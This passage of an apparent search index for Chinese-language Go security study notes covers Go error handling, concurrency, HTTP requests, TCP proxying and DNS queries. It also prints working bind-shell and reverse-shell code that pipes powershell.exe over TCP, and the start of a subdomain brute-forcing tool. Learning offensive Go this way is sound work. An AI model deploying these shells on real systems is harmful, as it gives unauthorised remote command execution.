fmt . Println ( \"Golang custom error is easy!\" ) } } panic\u548crecover panic\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u7c7b\u4f3c\u4e8epython\u4e2d\u7684raise, \u7528\u4e8e\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38, panic\u53ef\u4ee5\u63a5\u53d7\u4efb\u610f\u7c7b\u578b\u7684\u5bf9\u8c61 \u5f53\u4e3b\u52a8\u629b\u51fa\u5f02\u5e38\u6216\u8005\u9047\u5230runt-ime panics\u65f6\u4ee3\u7801\u5c06\u4f1a\u7ec8\u6b62\u6267\u884c,\u7136\u540e\u6309\u7167FILO\u7684\u89c4\u5219\u6267\u884cdefer\u51fd\u6570 recover\u4e3agolang\u5185\u7f6e\u51fd\u6570, \u53ea\u80fd\u5728defer\u51fd\u6570\u4e2d\u88ab\u8c03\u7528,\u7528\u4e8e\u63a5\u6536panic \u51fd\u6570\u7684\u53c2\u6570\u4fe1\u606f \u5982\u679c\u5728 defer \u8bed\u53e5\u4e2d\u4e5f\u8c03\u7528 panic \u51fd\u6570\uff0c\u5219\u53ea\u6709\u6700\u540e\u4e00\u4e2a\u88ab\u8c03\u7528\u7684 panic \u51fd\u6570\u7684\u53c2\u6570\u4f1a\u88ab recover \u51fd\u6570\u83b7\u53d6\u5230\u3002\u5982\u679c goroutine \u6ca1\u6709 panic\uff0c\u90a3\u8c03\u7528 recover \u51fd\u6570\u4f1a\u8fd4\u56de nil package main import ( \"fmt\" ) func Test () { defer func () { if r := recover (); r != nil { fmt . Println ( \"Panic info is:\" , r ) } }() panic ( \"Oh no panic!\" ) } func main () { Test () }","title":"go \u5f02\u5e38\u5904\u7406"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u5e76\u53d1\u4e0e\u4fe1\u9053","text":"\u5e76\u53d1 golang\u4e2d\u4f7f\u7528go\u5173\u952e\u5b57\u5f00\u542f\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b(goroutine) \u534f\u7a0b\u9ed8\u8ba4\u662f\u5355\u6838\u5e76\u53d1\u7684,\u53ef\u4ee5\u901a\u8fc7 runtime.GOMAXPROCS(cpuNum) \u6765\u4f7f\u5176\u591a\u6838\u5e76\u884c \u5b50\u534f\u7a0b\u4f1a\u5728\u4e3b\u534f\u7a0b\u9000\u51fa\u65f6\u9000\u51fa \u793a\u4f8b\u5982\u4e0b package main import ( \"os\" \"time\" ) func test () { for { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) } } func main () { go test () time . Sleep ( 3 * time . Second ) } \u4fe1\u9053 \u76f8\u5173\u6587\u7ae0 \u8be6\u89e3Go\u4fe1\u9053 golang\u4e2d\u4f7f\u7528chan\u6765\u58f0\u660e\u4e00\u4e2a\u4fe1\u9053 \u4fe1\u9053\u6709\u5bb9\u91cf\u548c\u957f\u5ea6\u4e4b\u5206,\u6709\u7f13\u5b58\u4e0e\u65e0\u7f13\u5b58\u4e4b\u5206,\u6709\u53cc\u5411\u4e0e\u5355\u5411\u4e4b\u5206 \u53ef\u4ee5\u4f7f\u7528\u4fe1\u9053\u505a\u9501, \u793a\u4f8b\u5982\u4e0b package main import ( \"fmt\" \"os\" \"time\" ) func test ( ch chan <- bool ) { file , _ := os . OpenFile ( \"test2.txt\" , os . O_RDWR | os . O_APPEND | os . O_CREATE , 0664 ) file . WriteString ( \"hello world\\n\" ) file . Sync () file . Close () time . Sleep ( 1 * time . Second ) ch <- true } func main () { ch := make ( chan bool ) go test ( ch ) <- ch fmt . Println ( \"finish\" ) }","title":"go \u5e76\u53d1\u4e0e\u4fe1\u9053"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%80%E7%AB%A0-Golang%E5%9F%BA%E7%A1%80/#go-\u9501\u4e0ewaitgroup","text":"go\u4e2d\u5b58\u5728\u6807\u51c6\u5e93sync \u9501\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2a\u9501 var lock sync . Mutex // \u4f7f\u7528\u9501 func test () { lock . Lock () defer lock . Unlock () // do something } // \u6ce8\u610f\u4e0d\u8981\u5728\u9501\u5df2Lock\u7684\u65f6\u5019\u518d\u6b21\u8bf7\u6c42\u9501,\u4f1a\u9020\u6210\u6b7b\u9501\u5e76\u4e14\u4e0d\u4f1a\u5f15\u53d1panic WaitGroup\u7684\u4f7f\u7528, \u793a\u4f8b\u5982\u4e0b // \u5b9a\u4e49\u4e00\u4e2aWaitGroup var wg sync . WaitGroup // \u4f7f\u7528WaitGroup\u4f18\u96c5\u5730\u7b49\u5f85\u5b50\u534f\u7a0b\u7ed3\u675f package main import ( \"fmt\" \"sync\" ) var wg sync . WaitGroup func test ( i int ) { wg . Add ( 1 ) defer wg . Done () fmt . Println ( \"here is \" , i , \"goroutine\" ) } func main () { for i := 0 ; i < 10 ; i ++ { go test ( i ) } wg . Wait () fmt . Println ( \"Done\" ) }","title":"go \u9501\u4e0eWaitGroup"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/","text":"\u7b2c\u4e09\u7ae0-HTTP # \u4e86\u89e3net/http\u5305 # \u6709\u4ee5\u4e0b\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570 Get(url string) (resp *Response, err error) Head(url string) (resp *Response, err error) Post(url string, bodyType string, body io.Reader) (resp *Response, err error) PostForm(url string, data url.Values) (resp *Response, err error) \u7b80\u5355\u5730\u53d1\u9001GET/POST\u8bf7\u6c42 package main import ( \"fmt\" \"io/ioutil\" \"log\" \"net/http\" \"net/url\" \"strings\" ) func main () { r1 , err := http . Get ( \"http://httpbin.org/get?a=1\" ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r1 . Body . Close () body , err := ioutil . ReadAll ( r1 . Body ) if err != nil { log . Fatalln ( \"Error: \" , err ) } fmt . Println ( string ( body )) form := url . Values {} form . Add ( \"foo\" , \"bar\" ) r2 , err := http . Post ( \"http://httpbin.org/post\" , \"application/x-www-form-urlencoded\" , strings . NewReader ( form . Encode ()), ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r2 . Body . Close () r3 , err := http . PostForm ( \"http://httpbin.org/post\" , form , ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r3 . Body . Close () } \u901a\u8fc7NewReuqest/Client\u62d3\u5c55\u8bf7\u6c42 # NewRequest\u5b9a\u4e49\u4e3a: NewRequest(umethod, vurl string, wbody io.Reader) (req *Request, err error) \u901a\u8fc7NewRequest\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934,\u793a\u4f8b\u5982\u4e0b: package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" ) type Result struct { Slideshow map [ string ] interface {} `json:\"slideshow\"` } func main () { req , err := http . NewRequest ( \"GET\" , \"https://httpbin.org/json\" , nil ) var client http . Client = http . Client {} req . Header . Add ( \"Accept\" , \"application/json\" ) resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () var result Result if err := json . NewDecoder ( resp . Body ). Decode ( & result ); err != nil { log . Fatalln ( \"error:\" , err ) } fmt . Printf ( \"%#v\\n\" , result ) } \u901a\u8fc7NewReuqest\u53d1\u9001\u5176\u4ed6\u8bf7\u6c42\u65b9\u6cd5, \u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" ) func main () { req , err := http . NewRequest ( \"DELETE\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () } Client\u53ef\u4ee5\u63a7\u5236\u91cd\u5b9a\u5411, \u8d85\u65f6\u65f6\u95f4\u7b49,\u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" \"time\" ) func main () { req , err := http . NewRequest ( \"GET\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client = http . Client { CheckRedirect : func ( req * http . Request , via [] * http . Request ) error { // \u7981\u6b62\u91cd\u5b9a\u5411 return http . ErrUseLastResponse }, Timeout : time . Duration ( 90 * time . Second ), // 90\u79d2\u8d85\u65f6\u65f6\u95f4 } resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () }","title":"\u7b2c\u4e09\u7ae0-HTTP"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u7b2c\u4e09\u7ae0-http","text":"","title":"\u7b2c\u4e09\u7ae0-HTTP"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u4e86\u89e3nethttp\u5305","text":"\u6709\u4ee5\u4e0b\u51e0\u4e2a\u5e38\u7528\u7684\u51fd\u6570 Get(url string) (resp *Response, err error) Head(url string) (resp *Response, err error) Post(url string, bodyType string, body io.Reader) (resp *Response, err error) PostForm(url string, data url.Values) (resp *Response, err error) \u7b80\u5355\u5730\u53d1\u9001GET/POST\u8bf7\u6c42 package main import ( \"fmt\" \"io/ioutil\" \"log\" \"net/http\" \"net/url\" \"strings\" ) func main () { r1 , err := http . Get ( \"http://httpbin.org/get?a=1\" ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r1 . Body . Close () body , err := ioutil . ReadAll ( r1 . Body ) if err != nil { log . Fatalln ( \"Error: \" , err ) } fmt . Println ( string ( body )) form := url . Values {} form . Add ( \"foo\" , \"bar\" ) r2 , err := http . Post ( \"http://httpbin.org/post\" , \"application/x-www-form-urlencoded\" , strings . NewReader ( form . Encode ()), ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r2 . Body . Close () r3 , err := http . PostForm ( \"http://httpbin.org/post\" , form , ) if err != nil { log . Fatalln ( \"Error: \" , err ) } defer r3 . Body . Close () }","title":"\u4e86\u89e3net/http\u5305"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%B8%89%E7%AB%A0-HTTP/#\u901a\u8fc7newreuqestclient\u62d3\u5c55\u8bf7\u6c42","text":"NewRequest\u5b9a\u4e49\u4e3a: NewRequest(umethod, vurl string, wbody io.Reader) (req *Request, err error) \u901a\u8fc7NewRequest\u81ea\u5b9a\u4e49\u8bf7\u6c42\u5934,\u793a\u4f8b\u5982\u4e0b: package main import ( \"encoding/json\" \"fmt\" \"log\" \"net/http\" ) type Result struct { Slideshow map [ string ] interface {} `json:\"slideshow\"` } func main () { req , err := http . NewRequest ( \"GET\" , \"https://httpbin.org/json\" , nil ) var client http . Client = http . Client {} req . Header . Add ( \"Accept\" , \"application/json\" ) resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () var result Result if err := json . NewDecoder ( resp . Body ). Decode ( & result ); err != nil { log . Fatalln ( \"error:\" , err ) } fmt . Printf ( \"%#v\\n\" , result ) } \u901a\u8fc7NewReuqest\u53d1\u9001\u5176\u4ed6\u8bf7\u6c42\u65b9\u6cd5, \u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" ) func main () { req , err := http . NewRequest ( \"DELETE\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () } Client\u53ef\u4ee5\u63a7\u5236\u91cd\u5b9a\u5411, \u8d85\u65f6\u65f6\u95f4\u7b49,\u793a\u4f8b\u5982\u4e0b: package main import ( \"log\" \"net/http\" \"time\" ) func main () { req , err := http . NewRequest ( \"GET\" , \"https://www.google.com/robots.txt\" , nil ) var client http . Client = http . Client { CheckRedirect : func ( req * http . Request , via [] * http . Request ) error { // \u7981\u6b62\u91cd\u5b9a\u5411 return http . ErrUseLastResponse }, Timeout : time . Duration ( 90 * time . Second ), // 90\u79d2\u8d85\u65f6\u65f6\u95f4 } resp , err := client . Do ( req ) if err != nil { log . Fatalln ( \"error:\" , err ) } defer resp . Body . Close () }","title":"\u901a\u8fc7NewReuqest/Client\u62d3\u5c55\u8bf7\u6c42"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/","text":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5 # \u5efa\u7acbTCP\u8fde\u63a5\u4e0e\u4ee3\u7406 # \u7b80\u5355\u5730\u8fde\u63a5\u5230\u67d0\u4e2aip\u548c\u7aef\u53e3 package main import ( \"fmt\" \"net\" ) func main () { conn , err := net . Dial ( \"tcp\" , \"scanme.nmap.org:80\" ) defer conn . Close () if err == nil { fmt . Println ( \"Connect success\" ) } } \u7b80\u5355\u5730\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1 package main import ( \"io\" \"log\" \"net\" \"strings\" ) func proxy ( conn net . Conn ) { dst , err := net . Dial ( \"tcp\" , \"localhost:80\" ) defer func () { dst . Close () conn . Close () }() if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go func () { if _ , err := io . Copy ( dst , conn ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"2 Error: %v\\n\" , err ) } }() if _ , err := io . Copy ( conn , dst ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"1 Error: %v\\n\" , err ) } } func main () { listener , err := net . Listen ( \"tcp\" , \":8888\" ) if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } for { conn , err := listener . Accept () if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go proxy ( conn ) } } echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f # \u6700\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f,\u4f7f\u7528 net.Conn.Read \u548c net.Conn.Write \u5e95\u5c42\u51fd\u6570 \u4f7f\u7528golang\u81ea\u5e26\u7684bufio\u5305,\u4f7f\u7528 bufio.NewReader.ReadString \u548c bufio.NewWriter.WriteString \u5b9e\u73b0,\u81ea\u5e26\u7f13\u5b58,\u5728\u5199\u5165\u7684\u65f6\u5019\u53ef\u80fd\u9700\u8981flush\u624d\u80fd\u7acb\u5373\u663e\u793a \u4f7f\u7528golang\u81ea\u5e26\u7684io\u5305,\u4f7f\u7528 io.Copy(dst *io.Writer, src *io.Reader) \u5b9e\u73b0,\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0Reader\u548cWriter,\u53ea\u9700\u8981\u5b9e\u73b0 Read(b []byte) (int, error) \u6216 Write(b []byte) (int, error) \u5373\u53ef \u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u4e2d\u4f7f\u7528net.Dial\u8fde\u63a5\u5230\u9700\u8981\u4ee3\u7406\u7684\u76ee\u6807,\u5e76\u4f7f\u7528io.Copy\u5c06\u8bf7\u6c42\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u81f3\u76ee\u6807(\u8d77\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b),\u5c06\u76ee\u6807\u7684\u54cd\u5e94\u53d1\u9001\u81f3\u8bf7\u6c42\u6e90 Golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u5927\u81f4\u6d41\u7a0b import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handle ( conn net . Conn ) { cmd := exec . Command ( \"powershell.exe\" ) rp , wp := io . Pipe () cmd . Stdin = conn // read input from conn cmd . Stdout = wp cmd . Stderr = wp go io . Copy ( conn , rp ) // read output to conn cmd . Run () conn . Close () } func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { listener , err := net . Listen ( \"tcp\" , \":20080\" ) if err != nil { log . Fatalln ( \"Unable to bind to port\" ) } log . Println ( \"Listening on 0.0.0.0:20080\" ) for { conn , err := listener . Accept () if err != nil { log . Fatalln ( \"Unable to accept connetcion\" ) } go handle ( conn ) } } Golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f # \u6838\u5fc3 \u548c\u6b63\u5411shell\u4e00\u6837 import import ( \"io\" \"net\" \"os/exec\" ) func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { reConn , _ := net . Dial ( \"tcp\" , \"127.0.0.1:8888\" ) handle2 ( reConn ); }","title":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5","text":"","title":"\u7b2c\u4e8c\u7ae0-\u7f51\u7edc\u8fde\u63a5"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u5efa\u7acbtcp\u8fde\u63a5\u4e0e\u4ee3\u7406","text":"\u7b80\u5355\u5730\u8fde\u63a5\u5230\u67d0\u4e2aip\u548c\u7aef\u53e3 package main import ( \"fmt\" \"net\" ) func main () { conn , err := net . Dial ( \"tcp\" , \"scanme.nmap.org:80\" ) defer conn . Close () if err == nil { fmt . Println ( \"Connect success\" ) } } \u7b80\u5355\u5730\u5b9e\u73b0\u7aef\u53e3\u8f6c\u53d1 package main import ( \"io\" \"log\" \"net\" \"strings\" ) func proxy ( conn net . Conn ) { dst , err := net . Dial ( \"tcp\" , \"localhost:80\" ) defer func () { dst . Close () conn . Close () }() if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go func () { if _ , err := io . Copy ( dst , conn ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"2 Error: %v\\n\" , err ) } }() if _ , err := io . Copy ( conn , dst ); err != nil && ! strings . Contains ( err . Error (), \"closed\" ) { log . Printf ( \"1 Error: %v\\n\" , err ) } } func main () { listener , err := net . Listen ( \"tcp\" , \":8888\" ) if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } for { conn , err := listener . Accept () if err != nil { log . Fatalf ( \"Error: %v\\n\" , err ) } go proxy ( conn ) } }","title":"\u5efa\u7acbTCP\u8fde\u63a5\u4e0e\u4ee3\u7406"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f","text":"\u6700\u5e95\u5c42\u7684\u5b9e\u73b0\u65b9\u5f0f,\u4f7f\u7528 net.Conn.Read \u548c net.Conn.Write \u5e95\u5c42\u51fd\u6570 \u4f7f\u7528golang\u81ea\u5e26\u7684bufio\u5305,\u4f7f\u7528 bufio.NewReader.ReadString \u548c bufio.NewWriter.WriteString \u5b9e\u73b0,\u81ea\u5e26\u7f13\u5b58,\u5728\u5199\u5165\u7684\u65f6\u5019\u53ef\u80fd\u9700\u8981flush\u624d\u80fd\u7acb\u5373\u663e\u793a \u4f7f\u7528golang\u81ea\u5e26\u7684io\u5305,\u4f7f\u7528 io.Copy(dst *io.Writer, src *io.Reader) \u5b9e\u73b0,\u53ef\u4ee5\u81ea\u5df1\u5b9e\u73b0Reader\u548cWriter,\u53ea\u9700\u8981\u5b9e\u73b0 Read(b []byte) (int, error) \u6216 Write(b []byte) (int, error) \u5373\u53ef","title":"echo\u670d\u52a1\u5668\u7684\u4e09\u79cd\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#\u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u4e2d\u4f7f\u7528net.Dial\u8fde\u63a5\u5230\u9700\u8981\u4ee3\u7406\u7684\u76ee\u6807,\u5e76\u4f7f\u7528io.Copy\u5c06\u8bf7\u6c42\u6e90\u7684\u8bf7\u6c42\u53d1\u9001\u81f3\u76ee\u6807(\u8d77\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b),\u5c06\u76ee\u6807\u7684\u54cd\u5e94\u53d1\u9001\u81f3\u8bf7\u6c42\u6e90","title":"\u7b80\u5355\u4ee3\u7406\u7684\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u4f7f\u7528net.Listen\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u670d\u52a1\u5668 \u5f53\u76d1\u542c\u5230\u65b0\u7684\u8fde\u63a5\u65f6\u4ea4\u7ed9\u4e00\u4e2a\u65b0\u7684\u534f\u7a0b\u5904\u7406 \u534f\u7a0b\u5927\u81f4\u6d41\u7a0b import ( \"io\" \"log\" \"net\" \"os/exec\" ) func handle ( conn net . Conn ) { cmd := exec . Command ( \"powershell.exe\" ) rp , wp := io . Pipe () cmd . Stdin = conn // read input from conn cmd . Stdout = wp cmd . Stderr = wp go io . Copy ( conn , rp ) // read output to conn cmd . Run () conn . Close () } func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { listener , err := net . Listen ( \"tcp\" , \":20080\" ) if err != nil { log . Fatalln ( \"Unable to bind to port\" ) } log . Println ( \"Listening on 0.0.0.0:20080\" ) for { conn , err := listener . Accept () if err != nil { log . Fatalln ( \"Unable to accept connetcion\" ) } go handle ( conn ) } }","title":"Golang\u6b63\u5411shell\u7684\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%8C%E7%AB%A0-%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5/#golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f","text":"\u6838\u5fc3 \u548c\u6b63\u5411shell\u4e00\u6837 import import ( \"io\" \"net\" \"os/exec\" ) func handle2 ( conn net . Conn ) { // \u540e\u6765\u53d1\u73b0\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837 cmd := exec . Command ( \"powershell.exe\" ) cmd . Stdin = conn cmd . Stdout = conn cmd . Stderr = conn cmd . Run () conn . Close () } func main () { reConn , _ := net . Dial ( \"tcp\" , \"127.0.0.1:8888\" ) handle2 ( reConn ); }","title":"Golang\u53cd\u5411shell\u5b9e\u73b0\u65b9\u5f0f"},{"location":"%E5%AE%89%E5%85%A8/golang/%E7%AC%AC%E4%BA%94%E7%AB%A0-DNS/","text":"\u7b2c\u4e94\u7ae0-DNS # \u4e3b\u8981\u5b66\u4e60 dns \u8fd9\u4e2a\u7b2c\u4e09\u5305\u7684\u4f7f\u7528 FQDN # \u4e00\u4e2a\u7b80\u5355\u7684dns\u7684 fully qualified domain name (fqdn)\u8bf7\u6c42,\u4f7f\u7528A\u8bb0\u5f55,\u5e76\u8f93\u51fa\u7ed3\u679c package main import ( \"fmt\" \"github.com/miekg/dns\" ) func main () { var msg dns . Msg fqdn := dns . Fqdn ( \"stacktitan.com\" ) msg . SetQuestion ( fqdn , dns . TypeA ) in , err := dns . Exchange ( & msg , \"8.8.8.8:53\" ) if err != nil { panic ( err ) } if len ( in . Answer ) < 1 { fmt . Println ( \"No records\" ) return } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { fmt . Println ( a . A ) } } } \u7b80\u5355\u5730\u5206\u6790\u4e00\u4e0b, in \u8fd9\u4e2a\u53d8\u91cf\u7c7b\u578b\u662fdns.Msg,\u800cMsg\u7684\u7ed3\u6784\u5982\u4e0b type Msg struct { MsgHdr Compress bool `json:\"-\"` // If true, the message will be compressed... u Question [] Question // Holds the RR(s) of the question section. v Answer [] RR // Holds the RR(s) of the answer section. Ns [] RR // Holds the RR(s) of the authority section. Extra [] RR // Holds the RR(s) of the additional section. } \u800cRR\u5219\u662f\u4e00\u4e2a\u63a5\u53e3,\u9700\u8981\u5b9e\u73b0\u4ee5\u4e0b\u51e0\u4e2a\u65b9\u6cd5 type RR interface { // Header returns the header of an resource record. The header contains // everything up to the rdata. Header () * RR_Header // String returns the text representation of the resource record. String () string // copy returns a copy of the RR copy () RR // len returns the length (in octets) of the compressed or uncompressed RR in wire format. // // If compression is nil, the uncompressed size will be returned, otherwise the compressed // size will be returned and domain names will be added to the map for future compression. len ( off int , compression map [ string ] struct {}) int // pack packs the records RDATA into wire format. The header will // already have been packed into msg. pack ( msg [] byte , off int , compression compressionMap , compress bool ) ( off1 int , err error ) // unpack unpacks an RR from wire format. // // This will only be called on a new and empty RR type with only the header populated. It // will only be called if the record's RDATA is non-empty. unpack ( msg [] byte , off int ) ( off1 int , err error ) // parse parses an RR from zone file format. // // This will only be called on a new and empty RR type with only the header populated. parse ( c * zlexer , origin string ) * ParseError // isDuplicate returns whether the two RRs are duplicates. isDuplicate ( r2 RR ) bool } \u6700\u540e\u904d\u5386answer(\u53d8\u91cf\u7c7b\u578b\u662fRR),\u8fd9\u91cc\u6709\u4e00\u4e2a\u5f3a\u5236\u8f6c\u6362 a, ok := answer.(*dns.A); ok ,\u5c06RR\u7c7b\u578b\u5f3a\u5236\u8f6c\u6362\u4e3a*dns.A,\u800cdns.A\u7684\u76f8\u5173\u7ed3\u6784\u53c8\u5982\u4e0b,\u53ef\u4ee5\u770b\u5230dns.A\u7ec4\u5408\u4e86RR Header\u8fd9\u4e2a\u7c7b\u578b,\u800cRR Header\u5b9e\u73b0\u4e86RR\u7684\u65b9\u6cd5,\u56e0\u6b64dns.A\u53ef\u4ee5\u662fRR\u7c7b\u578b // A RR. See RFC 1035. type A struct { Hdr RR_Header A net . IP `dns:\"a\"` } // RR_Header is the header all DNS resource records share. type RR_Header struct { Name string `dns:\"cdomain-name\"` Rrtype uint16 Class uint16 Ttl uint32 Rdlength uint16 // Length of data after header. } // Header returns itself. This is here to make RR_Header implements the RR interface. func ( h * RR_Header ) Header () * RR_Header { return h } // Just to implement the RR interface. func ( h * RR_Header ) copy () RR { return nil } // ... subdomain_fuzzer # \u53c2\u8003blackhat-go\u91ccsubdomain_guesser\u5199\u7684,\u4e00\u4e2a\u7b80\u5355\u7684\u6839\u636e\u5b57\u5178\u901a\u8fc7dns\u67e5\u8be2\u7206\u7834\u5b50\u57df\u540d\u7684\u5de5\u5177,\u6838\u5fc3\u57fa\u672c\u4e00\u6837,\u4f46\u662f\u7531\u4e8e\u539f\u4f5c\u8005\u5199\u7684\u534f\u7a0b\u5e76\u53d1\u4ee3\u7801\u6709\u70b9\u96be\u4ee5\u7406\u89e3,\u6240\u4ee5\u7a0d\u5fae\u4fee\u6539\u4e86\u4e00\u4e0b,\u4f7f\u7528\u4e86 sizedwaitgroup \u8fd9\u4e2a\u5305 package main import ( \"bufio\" \"errors\" \"flag\" \"fmt\" \"os\" \"github.com/miekg/dns\" \"github.com/remeh/sizedwaitgroup\" ) // type Result struct { IpAddress string Hostname string } // func LookupA ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var ips [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeA ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return ips , err } if len ( in . Answer ) < 1 { return ips , errors . New ( \"No answer\" ) } for _ , answer := range in . Answer { if a , ok := answer .( * dns . A ); ok { ips = append ( ips , a . A . String ()) } } return ips , nil } func LookupCNAME ( fqdn , serverAddr string ) ([] string , error ) { var m dns . Msg var fqdns [] string m . SetQuestion ( dns . Fqdn ( fqdn ), dns . TypeCNAME ) in , err := dns . Exchange ( & m , serverAddr ) if err != nil { return 